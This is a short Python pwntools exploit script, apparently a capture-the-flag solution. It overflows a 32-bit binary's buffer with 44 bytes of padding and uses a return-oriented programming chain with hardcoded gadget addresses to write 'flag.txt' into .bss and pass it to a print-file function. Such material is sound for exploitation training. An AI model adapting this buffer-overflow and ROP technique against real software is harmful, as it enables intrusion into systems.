from pwn import *

junk = b'AAAA'

printf_file = 0x80483d0

g1 = 0x08048543 #  mov    DWORD PTR [edi],ebp; ret;
g2 = 0x080485aa #  pop edi; pop ebp; ret;

bss = 0x804a020





def write_to(adr, s):
    if len(s)==0:
        return b""
    
    chain = p32(g2) + p32(adr) + s[:4] + p32(g1)
    return chain + write_to(adr+4,s[4:])








payload = cyclic(44)
payload += write_to(bss,b"flag.txt")
payload += p32(printf_file) + junk + p32(bss)


with open("payload", "wb") as f: f.write(payload)


